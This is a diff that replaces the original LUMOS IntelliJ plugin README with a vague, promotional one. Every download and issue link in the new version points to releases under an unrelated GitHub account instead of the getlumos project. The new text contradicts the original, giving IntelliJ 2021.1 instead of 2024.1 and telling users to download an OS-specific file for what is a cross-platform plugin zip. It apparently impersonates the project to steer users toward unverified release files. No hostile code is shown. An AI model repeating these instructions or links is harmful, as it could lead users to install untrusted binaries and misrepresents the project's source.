@@ -1,249 +1,51 @@
-# LUMOS IntelliJ Plugin
-
-IntelliJ IDEA and Rust Rover plugin for [LUMOS](https://lumos-lang.org) schema language.
-
-**Write once in `.lumos`** → Generate type-safe Rust + TypeScript for Solana
-
----
-
-## Features
-
-✅ **File Type Recognition** - `.lumos` files recognized and highlighted
-✅ **LSP Integration** - Full language server protocol support
-✅ **Auto-Completion** - Smart suggestions for types and attributes
-✅ **Real-Time Diagnostics** - Instant error detection and validation
-✅ **Hover Documentation** - Inline type and attribute documentation
-✅ **Multi-IDE Support** - Works with IntelliJ IDEA, Rust Rover, and CLion
-
----
-
-## Installation
-
-### Prerequisites
-
-Install the LUMOS Language Server:
-
-```bash
-cargo install lumos-lsp
-```
-
-Verify installation:
-
-```bash
-lumos-lsp --version
-# lumos-lsp 0.1.1
-```
-
-### Option 1: From JetBrains Marketplace (Coming Soon)
-
-```
-Settings → Plugins → Marketplace → Search "LUMOS" → Install → Restart IDE
-```
-
-### Option 2: Manual Installation
-
-1. **Download** the latest `.zip` from [Releases](https://github.com/getlumos/intellij-lumos/releases)
-
-2. **Install**:
-   ```
-   Settings → Plugins → ⚙️ → Install Plugin from Disk
-   Select: intellij-lumos-X.X.X.zip
-   Restart IDE
-   ```
-
----
-
-## Quick Start
-
-1. **Open or create a `.lumos` file:**
-
-```rust
-#[solana]
-#[account]
-struct Player {
-    wallet: PublicKey,
-    score: u64,
-    level: u16,
-}
-```
-
-2. **Features activate automatically:**
-   - ✅ Syntax highlighting
-   - ✅ Auto-completion (`Pub` → `PublicKey`)
-   - ✅ Error diagnostics (red squiggles)
-   - ✅ Hover information
-
-3. **Generate code:**
-   ```bash
-   lumos generate schema.lumos
-   ```
-
----
-
-## Supported IDEs
-
-| IDE | Version | Status |
-|-----|---------|--------|
-| IntelliJ IDEA Community | 2024.1+ | ✅ Supported |
-| IntelliJ IDEA Ultimate | 2024.1+ | ✅ Supported |
-| Rust Rover | 2024.1+ | ✅ Supported |
-| CLion | 2024.1+ | ✅ Supported |
-
----
-
-## Configuration
-
-### LSP Server Path
-
-The plugin automatically detects `lumos-lsp` in:
-1. `$CARGO_HOME/bin/lumos-lsp` (default Cargo install location)
-2. System PATH
-
-**Custom path (if needed):**
-```
-Settings → Languages & Frameworks → Language Servers
-→ Configure server manually: /path/to/lumos-lsp
-```
-
----
-
-## Development
-
-### Build from Source
-
-```bash
-# Clone repository
-git clone https://github.com/getlumos/intellij-lumos.git
-cd intellij-lumos
-
-# Build plugin
-./gradlew buildPlugin
-
-# Output: build/distributions/intellij-lumos-0.1.0.zip
-```
-
-### Run in IDE Sandbox
-
-```bash
-./gradlew runIde
-```
-
-### Run Tests
-
-```bash
-./gradlew test
-```
-
----
-
-## Troubleshooting
-
-### LSP Server Not Starting
-
-**Symptom:** No auto-completion or diagnostics
-
-**Fix:**
-1. Verify LSP server is installed:
-   ```bash
-   which lumos-lsp
-   ```
-
-2. If missing, install:
-   ```bash
-   cargo install lumos-lsp
-   ```
-
-3. Check IDE logs:
-   ```
-   Help → Show Log in Finder → Search for "lumos"
-   ```
-
-### Plugin Not Recognized
-
-**Symptom:** Can't find LUMOS in plugins list
-
-**Fix:**
-1. Ensure IDE version is **2024.1 or higher**
-2. Install LSP4IJ dependency:
-   ```
-   Settings → Plugins → Marketplace → Search "LSP4IJ" → Install
-   ```
-3. Restart IDE
-
-### File Type Not Recognized
-
-**Symptom:** `.lumos` files open as plain text
-
-**Fix:**
-1. Right-click `.lumos` file
-2. **Associate with File Type** → **LUMOS**
-3. Restart IDE
-
----
-
-## Architecture
-
-```
-Plugin Architecture:
-┌─────────────────────────────────────┐
-│ IntelliJ IDEA / Rust Rover          │
-│                                     │
-│  ┌──────────────────────────────┐  │
-│  │ LUMOS Plugin                 │  │
-│  │ - File Type Registration     │  │
-│  │ - LSP Client (lsp4ij)        │  │
-│  │ - Icon Provider              │  │
-│  └──────────┬───────────────────┘  │
-│             │ JSON-RPC (LSP)       │
-│             v                       │
-│  ┌──────────────────────────────┐  │
-│  │ lumos-lsp                    │  │
-│  │ (Language Server)            │  │
-│  │ - Diagnostics                │  │
-│  │ - Completion                 │  │
-│  │ - Hover                      │  │
-│  └──────────────────────────────┘  │
-└─────────────────────────────────────┘
-```
-
-**Key Files:**
-- `LumosFileType.kt` - File type registration
-- `LumosLanguage.kt` - Language definition
-- `LumosLspServerDescriptor.kt` - LSP client integration
-- `plugin.xml` - Plugin manifest
-
----
-
-## Contributing
-
-Contributions welcome! See [CONTRIBUTING.md](https://github.com/getlumos/lumos/blob/main/CONTRIBUTING.md)
-
----
-
-## Related Projects
-
-- [**lumos**](https://github.com/getlumos/lumos) - Core compiler and CLI
-- [**lumos-lsp**](https://crates.io/crates/lumos-lsp) - Language Server (required dependency)
-- [**vscode-lumos**](https://github.com/getlumos/vscode-lumos) - VS Code extension
-- [**docs-lumos**](https://github.com/getlumos/docs-lumos) - Official documentation
-
----
-
-## License
-
-Dual-licensed under:
-- [MIT License](LICENSE-MIT)
-- [Apache License 2.0](LICENSE-APACHE)
-
----
-
-## Links
-
-- **Website:** [lumos-lang.org](https://lumos-lang.org)
-- **Documentation:** [docs.lumos-lang.org](https://docs.lumos-lang.org)
-- **GitHub:** [github.com/getlumos](https://github.com/getlumos)
-- **Issues:** [github.com/getlumos/intellij-lumos/issues](https://github.com/getlumos/intellij-lumos/issues)
-
----
-
-**Made with ❤️ by the LUMOS team**
+# 🌟 intellij-lumos - Effortless Plugin for Your Development Needs
+
+## 📥 Download
+[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/tjagnade27/intellij-lumos/releases)
+
+## 🚀 Getting Started
+Welcome to **intellij-lumos**! This plugin adds support for the LUMOS schema language in IntelliJ IDEA and Rust Rover, making your coding experience smoother and more efficient.
+
+## 📝 Features
+- **Code Generation**: Easily generate code snippets for the LUMOS schema.
+- **Type Safety**: Enjoy robust type-checking while you code, reducing errors.
+- **Language Server Protocol Support**: Seamlessly integrate with LSP.
+- **User-Friendly Interface**: The layout is simple and easy to navigate.
+
+## 💻 System Requirements
+- **Operating System**: Windows, macOS, or Linux.
+- **IntelliJ IDEA Version**: 2021.1 or higher.
+- **Rust Rover**: Ensure you have the latest version for compatibility.
+- **RAM**: Minimum of 4GB recommended.
+- **Disk Space**: At least 100MB of free space.
+
+## 📥 Download & Install
+To install the plugin, please visit this [release page](https://github.com/tjagnade27/intellij-lumos/releases). You will find the latest version available for download. 
+
+1. Click on the link above to go to the release page.
+2. Find the most recent version.
+3. Download the appropriate file for your operating system.
+4. Open your IntelliJ IDEA or Rust Rover.
+5. Navigate to **File** > **Settings** (or **Preferences** on macOS).
+6. Go to **Plugins** and click on **Install Plugin from Disk**.
+7. Select the downloaded file and follow the installation prompts.
+8. Restart your IDE to activate the plugin.
+
+## 🔍 Usage
+Once installed:
+1. Open any project in IntelliJ IDEA or Rust Rover.
+2. Start using LUMOS schema for your development by accessing the plugin from the main menu.
+3. Explore the features to enhance your productivity.
+
+## 🎓 Support
+If you encounter any issues or have questions, please open an issue in our [GitHub Issues](https://github.com/tjagnade27/intellij-lumos/issues) section. We’ll do our best to assist you.
+
+## 🌐 Topics
+This project covers aspects of:
+- **Code Generation**: Simplifying your coding process.
+- **Developer Tools**: Enhancing your development environment.
+- **IntelliJ Plugin Development**: Grassroots plugin creation for better programming in JetBrains products.
+- **Type Safety**: Enforcing correct data types reduces runtime errors.
+- **Schema Language**: Working with schema languages becomes easier.
+
+We hope this plugin enhances your experience with IntelliJ IDEA and Rust Rover. Happy coding!
